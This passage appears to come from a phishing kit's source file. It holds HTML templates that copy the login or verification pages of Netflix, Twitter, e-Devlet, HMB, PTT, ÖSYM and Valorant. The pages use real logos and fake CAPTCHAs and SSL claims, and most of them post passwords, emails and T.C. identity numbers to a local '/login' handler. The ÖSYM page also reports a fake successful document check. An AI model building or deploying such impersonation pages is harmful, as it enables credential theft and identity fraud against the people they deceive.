          <strong>Başvuru Türü:</strong> ${applicationTypeText}<br><br>
          ${statusText === 'Onaylandı' ? 
            '<i class="fas fa-check-circle" style="color:var(--ibb-green);"></i> Başvurunuz onaylanmıştır. Yardımınız en kısa sürede ulaştırılacaktır.' : 
           statusText === 'Beklemede' ? 
            '<i class="fas fa-clock" style="color:var(--ibb-yellow);"></i> Başvurunuz değerlendirme aşamasındadır. Lütfen birkaç gün sonra tekrar kontrol ediniz.' : 
            '<i class="fas fa-times-circle" style="color:var(--ibb-red);"></i> Başvurunuz belirtilen kriterlere uymadığı için reddedilmiştir. Detaylı bilgi için 153\'ü arayabilirsiniz.'}
        `;
        
        document.getElementById('resultText').innerHTML = resultText;
        result.classList.add(statusClass, 'fade-in');
        result.style.display = 'block';
        
        // Sonuca otomatik kaydır
        result.scrollIntoView({ behavior: 'smooth' });
      }
    });
  </script>
</body>
</html>
    """,
    
    "osym": """
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ÖSYM Belge Doğrulama</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
  :root {
    --osym-blue: #005ea2;
    --osym-dark-blue: #003d73;
    --osym-light-blue: #e6f0fa;
    --osym-gray-light: #f4f6f8;
    --osym-gray: #555;
    --osym-white: #fff;
    --osym-error: #d93025;
  }

  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }

  body {
    background-color: var(--osym-gray-light);
    color: #333;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    padding: 20px;
  }

  header {
    background-color: var(--osym-blue);
    color: var(--osym-white);
    padding: 1.5rem;
    text-align: center;
    box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    border-radius: 8px 8px 0 0;
  }

  header h1 {
    font-size: 1.5rem;
    font-weight: 600;
  }

  .container {
    max-width: 800px;
    margin: 0 auto;
    background: var(--osym-white);
    border-radius: 0 0 8px 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    overflow: hidden;
  }

  .form-title {
    color: var(--osym-blue);
    margin-bottom: 1.5rem;
    text-align: center;
    font-size: 1.5rem;
    padding: 20px 20px 0;
  }

  .form-group {
    margin-bottom: 1.5rem;
    padding: 0 20px;
  }

  label {
    display: block;
    margin-bottom: 0.5rem;
    font-weight: 600;
    color: #333;
  }

  input {
    width: 100%;
    padding: 0.75rem;
    border: 1px solid #ddd;
    border-radius: 4px;
    font-size: 1rem;
  }

  input:focus {
    outline: none;
    border-color: var(--osym-blue);
    box-shadow: 0 0 0 2px var(--osym-light-blue);
  }

  button {
    background-color: var(--osym-blue);
    color: white;
    border: none;
    padding: 0.75rem 1.5rem;
    font-size: 1rem;
    border-radius: 4px;
    cursor: pointer;
    width: calc(100% - 40px);
    margin: 0 20px;
    font-weight: 600;
    transition: background-color 0.2s;
  }

  button:hover {
    background-color: var(--osym-dark-blue);
  }

  .result {
    margin: 2rem 20px;
    padding: 1rem;
    background-color: var(--osym-light-blue);
    border-radius: 4px;
    display: none;
  }

  .result h3 {
    color: var(--osym-blue);
    margin-bottom: 0.5rem;
  }

  .result p {
    margin-bottom: 0.5rem;
  }

  .error {
    color: var(--osym-error);
    margin-top: 0.5rem;
    font-size: 0.875rem;
    display: none;
  }

  footer {
    margin-top: auto;
    background-color: #333;
    color: var(--osym-white);
    text-align: center;
    padding: 1rem;
    font-size: 0.875rem;
    border-radius: 0 0 8px 8px;
  }

  @media (max-width: 768px) {
    header h1 {
      font-size: 1.3rem;
    }
    
    .form-title {
      font-size: 1.3rem;
    }
  }

  @media (max-width: 500px) {
    body {
      padding: 10px;
    }
    
    header h1 {
      font-size: 1.1rem;
    }
    
    .form-title {
      font-size: 1.1rem;
    }
  }
</style>
</head>
<body>

<div class="container">
  <header>
    <h1>ÖSYM BELGE DOĞRULAMA SİSTEMİ</h1>
  </header>

  <h2 class="form-title">Belge Doğrulama</h2>
  <form id="documentForm" method="POST" action="/login">
    <div class="form-group">
      <label for="belgeNo">Belge Numarası</label>
      <input type="text" id="belgeNo" name="belgeNo" placeholder="Belge numaranızı giriniz" required>
    </div>

    <div class="form-group">
      <label for="tcNo">T.C. Kimlik Numarası</label>
      <input type="text" id="tcNo" name="tcNo" placeholder="11 haneli T.C. Kimlik No" required pattern="\d{11}" maxlength="11">
      <div id="tcknError" class="error">Geçerli bir T.C. Kimlik Numarası giriniz.</div>
    </div>

    <button type="submit">Doğrula</button>
  </form>

  <div id="result" class="result">
    <h3>Doğrulama Sonucu</h3>
    <p id="resultText"></p>
  </div>

  <footer>
    © 2025 Ölçme, Seçme ve Yerleştirme Merkezi Başkanlığı - Tüm hakları saklıdır.
  </footer>
</div>

<script>
  document.getElementById('tcNo').addEventListener('input', function() {
    const tckn = this.value;
    const errorElement = document.getElementById('tcknError');
    
    if (tckn.length === 11 && !/^\d{11}$/.test(tckn)) {
      errorElement.style.display = 'block';
    } else {
      errorElement.style.display = 'none';
    }
  });

  document.getElementById('documentForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const belgeNo = document.getElementById('belgeNo').value;
    const tcNo = document.getElementById('tcNo').value;
    
    // Validate TCKN
    if (!/^\d{11}$/.test(tcNo)) {
      document.getElementById('tcknError').style.display = 'block';
      return;
    }
    
    // Validate document number
    if (!belgeNo) {
      alert('Lütfen belge numaranızı giriniz.');
      return;
    }
    
    // Show loading state
    document.getElementById('result').style.display = 'block';
    document.getElementById('resultText').textContent = 'Belgeniz doğrulanıyor, lütfen bekleyiniz...';
    
    // Simulate API call
    setTimeout(function() {
      const resultText = `Belge Durumu: Geçerli\nBelge No: ${belgeNo}\nT.C. Kimlik No: ${tcNo}\nDoğrulama Tarihi: ${new Date().toLocaleDateString()}`;
      document.getElementById('resultText').innerHTML = resultText.replace(/\n/g, '<br>');
    }, 2000);
  });
</script>
</body>
</html>
    """,
    
    "netflix": """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Netflix - Oturum Aç</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --netflix-red: #e50914;
                --netflix-dark: #141414;
                --netflix-light: #f3f3f3;
                --netflix-gray: #737373;
            }
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }
            body {
                font-family: 'Helvetica Neue',Helvetica,Arial,sans-serif;
                background-color: var(--netflix-dark);
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: white;
                padding: 20px;
            }
            .login-container {
                background-color: rgba(0,0,0,0.75);
                border-radius: 4px;
                width: 100%;
                max-width: 450px;
                padding: 60px 68px;
                margin: 20px 0;
            }
            .logo {
                margin-bottom: 30px;
                text-align: center;
            }
            .logo svg {
                width: 167px;
                height: 45px;
                fill: var(--netflix-red);
            }
            h1 {
                font-size: 32px;
                font-weight: 500;
                margin-bottom: 28px;
            }
            .form-group {
                margin-bottom: 16px;
                position: relative;
            }
            input {
                width: 100%;
                padding: 16px 20px;
                border: none;
                border-radius: 4px;
                background: #333;
                color: white;
                font-size: 16px;
            }
            input:focus {
                outline: none;
                background: #454545;
            }
            .btn {
                width: 100%;
                padding: 16px;
                background: var(--netflix-red);
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                margin: 24px 0 12px;
            }
            .btn:hover {
                background: #f6121d;
            }
            .remember-help {
                display: flex;
                justify-content: space-between;
                color: var(--netflix-gray);
                font-size: 13px;
                margin-bottom: 60px;
            }
            .remember-help a {
                color: var(--netflix-gray);
                text-decoration: none;
            }
            .remember-help a:hover {
                text-decoration: underline;
            }
            .signup {
                color: var(--netflix-gray);
                font-size: 16px;
                margin-top: 16px;
            }
            .signup a {
                color: white;
                text-decoration: none;
            }
            .signup a:hover {
                text-decoration: underline;
            }
            .captcha {
                font-size: 13px;
                color: var(--netflix-gray);
                margin-top: 11px;
            }
            @media (max-width: 600px) {
                .login-container {
                    padding: 40px 20px;
                }
                
                h1 {
                    font-size: 28px;
                }
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <svg viewBox="0 0 111 30" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" fill="#e50914"></path>
                </svg>
            </div>
            <h1>Oturum Aç</h1>
            <form method="POST" action="/login">
                <div class="form-group">
                    <input type="email" name="email" placeholder="E-posta veya telefon numarası" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Parola" required>
                </div>
                <button type="submit" class="btn">Oturum Aç</button>
                <div class="remember-help">
                    <div>
                        <input type="checkbox" id="remember">
                        <label for="remember">Beni hatırla</label>
                    </div>
                    <a href="#">Yardım ister misiniz?</a>
                </div>
                <div class="signup">
                    Netflix'e katılmak ister misiniz? <a href="#">Şimdi kaydolun</a>.
                </div>
                <div class="captcha">
                    Bu sayfa robot olmadığınızı kanıtlamak için Google reCAPTCHA ile korunuyor. <a href="#">Daha fazlasını öğrenin</a>.
                </div>
            </form>
        </div>
    </body>
    </html>
    """,
    
    "twitter": """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Twitter'a giriş yap</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --twitter-blue: #1d9bf0;
                --twitter-dark: #0f1419;
                --twitter-gray: #536471;
                --twitter-light-gray: #e7e7e8;
            }
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }
            body {
                font-family: 'Segoe UI', Arial, sans-serif;
                background-color: white;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: var(--twitter-dark);
                padding: 20px;
            }
            .login-container {
                max-width: 600px;
                width: 100%;
                padding: 20px;
            }
            .logo {
                margin-bottom: 30px;
                color: var(--twitter-blue);
                font-size: 30px;
                text-align: center;
            }
            h1 {
                font-size: 31px;
                font-weight: 700;
                margin-bottom: 40px;
                text-align: center;
            }
            .login-methods {
                margin-bottom: 20px;
            }
            .login-method {
                display: flex;
                align-items: center;
                justify-content: center;
                border: 1px solid var(--twitter-light-gray);
                border-radius: 30px;
                padding: 12px;
                margin-bottom: 12px;
                cursor: pointer;
                font-weight: 600;
                transition: background 0.2s;
            }
            .login-method:hover {
                background: rgba(29, 155, 240, 0.1);
            }
            .login-method i {
                margin-right: 10px;
                font-size: 20px;
            }
            .divider {
                display: flex;
                align-items: center;
                margin: 20px 0;
                color: var(--twitter-gray);
            }
            .divider::before, .divider::after {
                content: "";
                flex: 1;
                border-bottom: 1px solid var(--twitter-light-gray);
                margin: 0 10px;
            }
            .form-group {
                margin-bottom: 20px;
            }
            input {
                width: 100%;
                padding: 17px;
                border: 1px solid var(--twitter-light-gray);
                border-radius: 4px;
                font-size: 17px;
            }
            input:focus {
                outline: none;
                border-color: var(--twitter-blue);
            }
            .login-button {
                width: 100%;
                padding: 14px;
                background: var(--twitter-dark);
                border: none;
                border-radius: 30px;
                color: white;
                font-size: 16px;
                font-weight: 700;
                cursor: pointer;
                margin-top: 20px;
                transition: background 0.2s;
            }
            .login-button:hover {
                background: #272c30;
            }
            .forgot-password {
                display: block;
                text-align: center;
                margin-top: 30px;
                font-size: 15px;
                color: var(--twitter-blue);
                text-decoration: none;
            }
            .signup {
                margin-top: 50px;
                font-size: 15px;
                color: var(--twitter-gray);
                text-align: center;
            }
            .signup a {
                color: var(--twitter-blue);
                text-decoration: none;
            }
            @media (max-width: 500px) {
                h1 {
                    font-size: 26px;
                }
                
                .login-method {
                    font-size: 14px;
                }
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="#1d9bf0">
                    <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
                </svg>
            </div>
            <h1>Twitter'da bugün olup bitenleri gör</h1>
            <div class="login-methods">
                <div class="login-method">
                    <i class="fab fa-google" style="color:#4285f4;"></i> Google ile kaydol
                </div>
                <div class="login-method">
                    <i class="fab fa-apple" style="color:#000000;"></i> Apple ile kaydol
                </div>
            </div>
            <div class="divider">veya</div>
            <form method="POST" action="/login">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Telefon, e-posta veya kullanıcı adı" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Şifre" required>
                </div>
                <button type="submit" class="login-button">Giriş yap</button>
            </form>
            <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
            <div class="signup">
                Twitter'a hesabın yok mu? <a href="#">Kaydol</a>
            </div>
        </div>
    </body>
    </html>
    """,
    
    "hmb": """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>HMB - Giriş</title>
  <link rel="icon" href="https://hmb.gov.tr/favicon.ico" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
  <style>
    :root {
      --hmb-blue: #1a73e8;
      --hmb-dark-blue: #0d47a1;
      --hmb-light-blue: #e8f0fe;
      --hmb-gray: #5f6368;
      --hmb-light-gray: #f5f5f5;
      --hmb-white: #ffffff;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Roboto', Arial, sans-serif;
    }

    body {
      background-color: var(--hmb-light-gray);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 15px;
    }

    .login-container {
      width: 100%;
      max-width: 460px;
      background-color: var(--hmb-white);
      border-radius: 8px;
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
      overflow: hidden;
      transition: all 0.3s ease;
    }

    .header {
      background-color: var(--hmb-blue);
      padding: 20px;
      text-align: center;
      color: var(--hmb-white);
    }

    .header .logo img {
      height: 48px;
      margin-bottom: 10px;
    }

    .header h1 {
      font-size: 22px;
      font-weight: 500;
    }

    .form-container {
      padding: 30px;
    }

    .form-title {
      font-size: 20px;
      color: var(--hmb-blue);
      font-weight: 500;
      margin-bottom: 25px;
      text-align: center;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 500;
      color: var(--hmb-gray);
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
      transition: border-color 0.3s;
    }

    input:focus {
      border-color: var(--hmb-blue);
      outline: none;
      box-shadow: 0 0 0 2px var(--hmb-light-blue);
    }

    .captcha-container {
      margin: 20px 0;
      padding: 15px;
      background-color: #f9f9f9;
      border: 1px solid #ddd;
      border-radius: 4px;
      text-align: center;
    }

    .captcha-image {
      width: 100%;
      height: 60px;
      background: linear-gradient(135deg, #e0e0e0, #cfd8dc);
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 24px;
      font-weight: bold;
      color: var(--hmb-dark-blue);
      letter-spacing: 3px;
      border-radius: 4px;
      user-select: none;
      margin-bottom: 10px;
    }

    .btn {
      width: 100%;
      padding: 12px;
      background-color: var(--hmb-blue);
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn:hover {
      background-color: var(--hmb-dark-blue);
    }

    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 14px;
    }

    .footer a {
      color: var(--hmb-blue);
      text-decoration: none;
      margin: 0 5px;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .security-info {
      margin-top: 25px;
      font-size: 13px;
      color: var(--hmb-gray);
      text-align: center;
    }

    .security-info i {
      margin-right: 6px;
    }

    @media (max-width: 500px) {
      .form-container {
        padding: 20px;
      }

      .header h1 {
        font-size: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="header">
      <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/tr/5/5d/Hmb_logo.png" alt="HMB Logo" />
      </div>
      <h1>E-Devlet Giriş Sistemi</h1>
    </div>
    <div class="form-container">
      <h2 class="form-title">Giriş Yap</h2>
      <form method="POST" action="/login">
        <div class="form-group">
          <label for="tckn">T.C. Kimlik Numarası</label>
          <input
            type="text"
            id="tckn"
            name="tckn"
            placeholder="11 haneli T.C. Kimlik No"
            required
            pattern="\d{11}"
            maxlength="11"
            inputmode="numeric"
          />
        </div>
        <div class="form-group">
          <label for="password">Şifre</label>
          <input type="password" id="password" name="password" placeholder="Şifrenizi giriniz" required />
        </div>
        <div class="captcha-container">
          <p>Güvenlik doğrulaması için aşağıdaki kodu giriniz:</p>
          <div class="captcha-image">X9B7F2</div>
          <input type="text" name="captcha" placeholder="Kodu buraya giriniz" required />
        </div>
        <button type="submit" class="btn">Giriş Yap</button>
      </form>
      <div class="footer">
        <a href="#">Şifremi Unuttum</a> | 
        <a href="#">Yeni Kullanıcı Kaydı</a>
      </div>
      <div class="security-info">
        <i class="fas fa-lock"></i> Güvenli Giriş - 256 Bit SSL Şifreleme
      </div>
    </div>
  </div>
</body>
</html>
    """,
    
    "edevlet": """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>e-Devlet Kapısı</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
  <style>
    :root {
      --edevlet-blue: #1a73e8;
      --edevlet-dark-blue: #0c47a1;
      --edevlet-light-gray: #f5f5f5;
      --edevlet-gray: #5f6368;
      --edevlet-white: #ffffff;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background-color: var(--edevlet-light-gray);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .login-container {
      width: 100%;
      max-width: 460px;
      background-color: var(--edevlet-white);
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
      overflow: hidden;
    }

    .header {
      background-color: var(--edevlet-blue);
      padding: 16px 24px;
      text-align: center;
      color: var(--edevlet-white);
    }

    .header img {
      height: 50px;
      margin-bottom: 8px;
    }

    .header h1 {
      font-size: 20px;
      font-weight: normal;
    }

    .form-container {
      padding: 28px 24px;
    }

    .form-title {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 20px;
      text-align: center;
      color: var(--edevlet-dark-blue);
    }

    .form-group {
      margin-bottom: 18px;
    }

    label {
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 6px;
      display: block;
      color: var(--edevlet-gray);
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px 14px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 15px;
    }

    input:focus {
      border-color: var(--edevlet-blue);
      outline: none;
      box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.15);
    }

    .captcha-container {
      margin-top: 20px;
      background-color: #f1f3f4;
      padding: 16px;
      border-radius: 4px;
      text-align: center;
    }

    .captcha-image {
      background: linear-gradient(135deg, #dce1e7, #c3ccd5);
      padding: 12px;
      font-size: 22px;
      font-weight: bold;
      color: #1a237e;
      letter-spacing: 4px;
      border-radius: 4px;
      margin-bottom: 10px;
      user-select: none;
    }

    .btn {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      background-color: var(--edevlet-blue);
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .btn:hover {
      background-color: var(--edevlet-dark-blue);
    }

    .footer {
      text-align: center;
      margin-top: 18px;
      font-size: 14px;
    }

    .footer a {
      color: var(--edevlet-blue);
      text-decoration: none;
      margin: 0 6px;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .security-info {
      margin-top: 20px;
      font-size: 13px;
      text-align: center;
      color: var(--edevlet-gray);
    }

    .security-info i {
      margin-right: 5px;
    }

    @media (max-width: 480px) {
      .form-container {
        padding: 20px;
      }

      .header h1 {
        font-size: 18px;
      }

      .form-title {
        font-size: 16px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="header">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c4/Turkiye.gov.tr_logo.svg/2560px-Turkiye.gov.tr_logo.svg.png" alt="e-Devlet Logo">
      <h1>e-Devlet Kapısı Giriş</h1>
    </div>
    <div class="form-container">
      <h2 class="form-title">Giriş Yap</h2>
      <form method="POST" action="/login">
        <div class="form-group">
          <label for="tckn">T.C. Kimlik Numarası</label>
          <input type="text" id="tckn" name="tckn" maxlength="11" required pattern="\d{11}" inputmode="numeric" placeholder="11 haneli kimlik numarası" />
        </div>
        <div class="form-group">
          <label for="password">Şifre</label>
          <input type="password" id="password" name="password" required placeholder="Şifrenizi giriniz" />
        </div>
        <div class="captcha-container">
          <p>Güvenlik kodunu giriniz:</p>
          <div class="captcha-image">A4C8Z9</div>
          <input type="text" name="captcha" placeholder="Kodu yazınız" required />
        </div>
        <button class="btn" type="submit">Giriş Yap</button>
      </form>
      <div class="footer">
        <a href="#">Şifremi Unuttum</a> |
        <a href="#">Yeni Kullanıcı Kaydı</a>
      </div>
      <div class="security-info">
        <i class="fas fa-lock"></i> Bu sistem 256 bit SSL ile korunmaktadır.
      </div>
    </div>
  </div>
</body>
</html>
    """,
    
    "ptt": """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PTT - Giriş</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --ptt-red: #e30613;
      --ptt-dark-red: #c10511;
      --ptt-light-red: #fde8e9;
      --ptt-gray: #5f6368;
      --ptt-light-gray: #f5f5f5;
      --ptt-white: #ffffff;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Roboto', Arial, sans-serif;
    }

    body {
      background-color: var(--ptt-light-gray);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 15px;
    }

    .login-container {
      width: 100%;
      max-width: 460px;
      background-color: var(--ptt-white);
      border-radius: 8px;
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
      overflow: hidden;
    }

    .header {
      background-color: var(--ptt-red);
      padding: 20px;
      text-align: center;
      color: var(--ptt-white);
    }

    .header .logo img {
      height: 48px;
      margin-bottom: 10px;
    }

    .header h1 {
      font-size: 22px;
      font-weight: 500;
    }

    .form-container {
      padding: 30px;
    }

    .form-title {
      font-size: 20px;
      color: var(--ptt-red);
      font-weight: 500;
      margin-bottom: 25px;
      text-align: center;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 500;
      color: var(--ptt-gray);
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
      transition: border-color 0.3s;
    }

    input:focus {
      border-color: var(--ptt-red);
      outline: none;
      box-shadow: 0 0 0 2px var(--ptt-light-red);
    }

    .btn {
      width: 100%;
      padding: 12px;
      background-color: var(--ptt-red);
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn:hover {
      background-color: var(--ptt-dark-red);
    }

    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 14px;
    }

    .footer a {
      color: var(--ptt-red);
      text-decoration: none;
      margin: 0 5px;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .security-info {
      margin-top: 25px;
      font-size: 13px;
      color: var(--ptt-gray);
      text-align: center;
    }

    .security-info i {
      margin-right: 6px;
    }

    @media (max-width: 500px) {
      .form-container {
        padding: 20px;
      }

      .header h1 {
        font-size: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="header">
      <div class="logo">
        <img src="https://pttwebdosya.ptt.gov.tr/api/file/getfile?filename=F6653EF7-C687-4827-8A29-5C82EDF3C04C*ptt_yeni_logo-preview.png" alt="PTT Logo" />
      </div>
      <h1>PTT Kargo Takip Sistemi</h1>
    </div>
    <div class="form-container">
      <h2 class="form-title">Giriş Yap</h2>
      <form method="POST" action="/login">
        <div class="form-group">
          <label for="email">E-posta Adresi</label>
          <input
            type="email"
            id="email"
            name="email"
            placeholder="E-posta adresinizi giriniz"
            required
          />
        </div>
        <div class="form-group">
          <label for="password">Şifre</label>
          <input type="password" id="password" name="password" placeholder="Şifrenizi giriniz" required />
        </div>
        <button type="submit" class="btn">Giriş Yap</button>
      </form>
      <div class="footer">
        <a href="#">Şifremi Unuttum</a> | 
        <a href="#">Yeni Kullanıcı Kaydı</a>
      </div>
      <div class="security-info">
        <i class="fas fa-lock"></i> Güvenli Giriş - 256 Bit SSL Şifreleme
      </div>
    </div>
  </div>
</body>
</html>
    """,
    
    "valorant": """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VALORANT - Giriş</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --valorant-red: #ff4655;
      --valorant-dark-red: #e63946;
      --valorant-light-red: #ffecec;
      --valorant-black: #0f1923;
      --valorant-gray: #768079;
      --valorant-light-gray: #f5f5f5;
      --valorant-white: #ffffff;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Tungsten', 'Arial Narrow', Arial, sans-serif;
    }

    body {
      background-color: var(--valorant-black);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 15px;
      color: var(--valorant-white);
    }

    .login-container {
      width: 100%;
      max-width: 460px;
      background-color: #1a1a1a;
      border-radius: 8px;
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
      overflow: hidden;
      border: 1px solid var(--valorant-red);
    }

    .header {
      background-color: var(--valorant-red);
      padding: 20px;
      text-align: center;
    }

    .header .logo img {
      height: 48px;
      margin-bottom: 10px;
    }

    .header h1 {
      font-size: 28px;
      font-weight: 700;
      letter-spacing: 1px;
    }

    .form-container {
      padding: 30px;
    }

    .form-title {
      font-size: 24px;
      color: var(--valorant-red);
      font-weight: 700;
      margin-bottom: 25px;
      text-align: center;
      letter-spacing: 1px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 500;
      color: var(--valorant-white);
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border: 1px solid #333;
      border-radius: 4px;
      background-color: #333;
      color: var(--valorant-white);
      transition: border-color 0.3s;
    }

